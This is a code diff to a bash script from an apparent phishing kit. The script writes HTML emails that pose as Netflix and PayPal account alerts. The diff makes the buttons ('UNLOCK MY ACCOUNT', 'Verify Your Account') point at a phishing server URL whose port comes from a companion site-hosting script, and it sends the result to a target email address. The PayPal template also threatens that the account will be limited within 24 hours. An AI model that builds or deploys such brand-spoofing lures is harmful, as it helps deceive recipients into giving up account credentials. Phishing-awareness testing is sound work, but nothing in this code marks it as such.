@@ -82,6 +82,21 @@ if [ -z "$TARGET_EMAIL" ]; then
     echo -e "${YELLOW}[INFO]${NC} No target specified in .env, sending to yourself: $TARGET_EMAIL"
 fi
 
+# Check if server port is set (from host_phishing_site.sh)
+SERVER_PORT=80
+if [ -f "server_port.txt" ]; then
+    SERVER_PORT=$(cat server_port.txt)
+    echo -e "${YELLOW}[INFO]${NC} Using port ${SERVER_PORT} from previous server setup"
+fi
+
+# Build the server URL with correct port
+if [ "$SERVER_PORT" == "80" ]; then
+    SERVER_URL="http://${SERVER_IP}"
+else
+    SERVER_URL="http://${SERVER_IP}:${SERVER_PORT}"
+fi
+echo -e "${YELLOW}[INFO]${NC} Phishing URL will be: ${SERVER_URL}"
+
 # Function to generate company name if not provided
 generate_company_name() {
     local companies=("Acme Industries" "Global Tech" "SecureNet" "TrustBank" "Lumon Industries" "CloudSync" "InfoCore" "DataSphere" "NetSecure" "Omnicorp")
@@ -284,7 +299,7 @@ generate_html_email() {
         echo "                            <table border=\"0\" cellpadding=\"0\" cellspacing=\"0\">"
         echo "                                <tr>"
         echo "                                    <td align=\"center\" bgcolor=\"${color}\" style=\"border-radius: 4px;\">"
-        echo "                                        <a href=\"http://${SERVER_IP}\" target=\"_blank\" style=\"display: inline-block; padding: 15px 30px; font-size: 16px; color: #ffffff; text-decoration: none; font-weight: bold;\">${button_text}</a>"
+        echo "                                        <a href=\"${SERVER_URL}\" target=\"_blank\" style=\"display: inline-block; padding: 15px 30px; font-size: 16px; color: #ffffff; text-decoration: none; font-weight: bold;\">${button_text}</a>"
         echo "                                    </td>"
         echo "                                </tr>"
         echo "                            </table>"
@@ -393,7 +408,7 @@ create_netflix_template() {
         echo "                            <table border=\"0\" cellpadding=\"0\" cellspacing=\"0\">"
         echo "                                <tr>"
         echo "                                    <td align=\"center\" bgcolor=\"#E50914\" style=\"border-radius: 4px;\">"
-        echo "                                        <a href=\"http://${SERVER_IP}\" target=\"_blank\" style=\"display: inline-block; padding: 15px 30px; font-size: 16px; color: #ffffff; text-decoration: none; font-weight: bold;\">UNLOCK MY ACCOUNT</a>"
+        echo "                                        <a href=\"${SERVER_URL}\" target=\"_blank\" style=\"display: inline-block; padding: 15px 30px; font-size: 16px; color: #ffffff; text-decoration: none; font-weight: bold;\">UNLOCK MY ACCOUNT</a>"
         echo "                                    </td>"
         echo "                                </tr>"
         echo "                            </table>"
@@ -510,7 +525,7 @@ create_paypal_template() {
         echo "            <p><strong>If you do not verify your account within 24 hours, your account will be limited and pending transactions may be canceled.</strong></p>"
         echo ""
         echo "            <p style=\"text-align: center;\">"
-        echo "                <a href=\"http://${SERVER_IP}\" class=\"button\" target=\"_blank\">Verify Your Account</a>"
+        echo "                <a href=\"${SERVER_URL}\" class=\"button\" target=\"_blank\">Verify Your Account</a>"
         echo "            </p>"
         echo ""
         echo "            <p>If you did not initiate this request, we recommend changing your password immediately after verification.</p>"
